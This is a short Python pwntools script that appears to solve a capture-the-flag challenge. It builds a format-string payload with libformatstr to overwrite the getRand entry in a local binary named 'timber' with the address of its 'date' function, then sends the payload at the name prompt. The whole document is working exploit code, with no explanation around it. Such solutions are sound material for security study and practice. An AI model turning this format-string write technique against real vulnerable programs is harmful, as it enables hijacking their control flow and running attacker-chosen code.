from pwn import *
from libformatstr import FormatStr

p = process('./timber')
elf = ELF('./timber')

date_addr = elf.symbols['date']
genMatch = elf.symbols['getRand']

print p.recvuntil('Please enter your name: ')

f = FormatStr()
f[genMatch] = date_addr
offset = 2
buf = ""
buf += f.payload(offset,2)

p.sendline(buf)
print p.recv(1024)
# p.interactive()
